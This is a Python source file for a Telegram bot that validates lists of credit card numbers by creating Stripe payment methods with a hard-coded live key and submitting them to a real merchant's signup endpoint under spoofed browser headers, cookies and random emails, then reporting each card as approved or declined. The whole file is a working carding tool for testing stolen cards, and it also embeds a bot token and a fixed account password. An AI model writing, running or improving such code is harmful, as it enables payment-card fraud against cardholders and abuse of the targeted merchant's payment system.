import requests
import time
import threading
import random
import re
import telebot  # Make sure you have pyTelegramBotAPI installed: pip install pyTelegramBotAPI

# Your bot token
BOT_TOKEN = "7634693376:AAGzz0nE7BfOR2XE7gyWGB6s4ycAL8pOUq"

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Store user states and data
user_data = {}

# Regular expression for parsing credit card input
CARD_PATTERN = re.compile(r'(\d{13,16})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})')

# Helper function to generate a random email
def generate_random_email():
    name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
    return f"{name}@gmail.com"

# Function to perform the card check
def check_card(user_id, card_info):
    card_number, exp_month, exp_year, cvc = card_info

    # Retrieve or initialize payment method ID
    payment_method_id = user_data[user_id].get('pm_id', '')

    # Stripe API endpoint
    url_stripe = "https://api.stripe.com/v1/payment_methods"
    payload_stripe = {
        'billing_details[name]': user_data[user_id].get('name', 'John Doe'),
        'billing_details[email]': generate_random_email(),
        'type': 'card',
        'card[number]': card_number,
        'card[cvc]': cvc,
        'card[exp_year]': exp_year,
        'card[exp_month]': exp_month,
        'allow_redisplay': 'unspecified',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/c4c47a1722; stripe-js-v3/c4c47a1722; payment-element; deferred-intent',
        'referrer': 'https://www.cribflyer.com',
        'client_attribution_metadata[client_session_id]': '61b2ec7c-b03f-463f-b50c-4f0a938d67df',
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'guid': 'df1cb213-3b8d-40b5-861d-b78e6fbb086a883b59',
        'muid': '976d1b11-0e75-48a9-b082-7f34b6ed436aa8eae6',
        'sid': 'e8dd1e23-3b38-4655-951e-e66134f0153e810f76',
        'key': 'pk_live_QzBMW6gThdrTmOZ1k4lPJtSU'
    }

    # Send request to Stripe API
    stripe_response = requests.post(url_stripe, data=payload_stripe)

    try:
        pm_response_json = stripe_response.json()
        pm_id = pm_response_json.get('id')
        if not pm_id:
            return "Error: Failed to retrieve payment method ID."
    except Exception as e:
        return f"Error parsing Stripe response: {str(e)}"

    # Store pm_id for user
    user_data[user_id]['pm_id'] = pm_id

    # Prepare payload for final check
    final_url = "https://www.cribflyer.com/signup/api"
    final_payload = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '196',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': (
            'cfid=f0999602-b357-441d-bce3-5e8d6861c302; cftoken=0; '
            'CF_CLIENT_CRIBFLYER_TC=1747139869662; _gcl_au=1.1.277038344.1747139873; '
            '_ga=GA1.2.509374650.1747139873; _gid=GA1.2.90002344.1747139873; '
            f'__stripe_mid={pm_id}; __stripe_sid=e8dd1e23-3b38-4655-951e-e66134f0153e810f76'
        ),
        'origin': 'https://www.cribflyer.com',
        'referer': 'https://www.cribflyer.com/signup/p=property_plan&qty=1',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': (
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
            '(KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'
        ),
        'x-requested-with': 'XMLHttpRequest',
        'email': user_data[user_id].get('email', generate_random_email()),
        'name': user_data[user_id].get('name', 'John Doe'),
        'firstname': user_data[user_id].get('name', 'John Doe').split()[0],
        'lastname': user_data[user_id].get('name', 'John Doe').split()[-1],
        'password': 'War112233$%',
        'confpassword': 'War112233$%',
        'product': 'property_plan',
        'qty': '1',
        'pmid': pm_id
    }

    # Send request to final URL
    final_response = requests.post(final_url, data=final_payload)
    response_text = final_response.text

    # Check response for success or decline
    if "ERROR" in response_text:
        return f"DECLINED:\n{response_text}"
    else:
        return f"APPROVED:\n{response_text}"

# Threaded function to process multiple cards with delay
def process_cards(user_id, cards):
    for card in cards:
        if user_data[user_id].get('stopped', False):
            break
        result = check_card(user_id, card)
        bot.send_message(user_id, result)
        time.sleep(15)  # Delay between checks to avoid rate limits

# Command handler: /start
@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.chat.id
    user_data[user_id] = {
        'state': 'waiting_for_cards',
        'cards': [],
        'stopped': False,
        'name': 'John Doe',  # Default name; you can enhance to ask user for name
        'email': generate_random_email()  # Default email; can be replaced with user input
    }
    bot.send_message(
        user_id,
        "Welcome! Please send the credit cards in one of these formats:\n"
        "CC|MM|YY|CVV\n"
        "CC|MM|YYYY|CVV\n"
        "CC/MM/YY/CVV\n"
        "CC/MM/YYYY/CVV\n"
        "You can send multiple cards separated by new lines."
    )

# Command handler: /stop
@bot.message_handler(commands=['stop'])
def handle_stop(message):
    user_id = message.chat.id
    if user_id in user_data:
        user_data[user_id]['stopped'] = True
        bot.send_message(user_id, "Checking stopped.")

# Message handler for card input
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.chat.id

    # Only process if user is in the correct state
    if user_id not in user_data or user_data[user_id].get('state') != 'waiting_for_cards':
        return

    text = message.text.strip()
    lines = text.split('\n')
    cards = []

    for line in lines:
        line = line.strip()
        match = CARD_PATTERN.match(line)
        if match:
            card_number = match.group(1).replace(' ', '').replace('-', '')
            exp_month = match.group(2).zfill(2)
            exp_year = match.group(3)
            if len(exp_year) == 2:
                exp_year = '20' + exp_year
            cvc = match.group(4)
            cards.append([card_number, exp_month, exp_year, cvc])
        else:
            # Try to parse other formats manually
            parts = re.split(r'[|/]', line)
            if len(parts) == 4:
                card_number = parts[0].replace(' ', '').replace('-', '')
                exp_month = parts[1].zfill(2)
                exp_year = parts[2]
                if len(exp_year) == 2:
                    exp_year = '20' + exp_year
                cvc = parts[3]
                cards.append([card_number, exp_month, exp_year, cvc])
            else:
                # Skip lines that don't match expected formats
                continue

    if not cards:
        bot.send_message(user_id, "No valid credit card entries found. Please check the format.")
        return

    # Save user data
    user_data[user_id]['cards'] = cards
    user_data[user_id]['stopped'] = False

    bot.send_message(user_id, f"Starting to check {len(cards)} card(s). You can send /stop to halt.")

    # Run the checks in a separate thread to avoid blocking
    threading.Thread(target=process_cards, args=(user_id, cards)).start()

# Start polling
if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()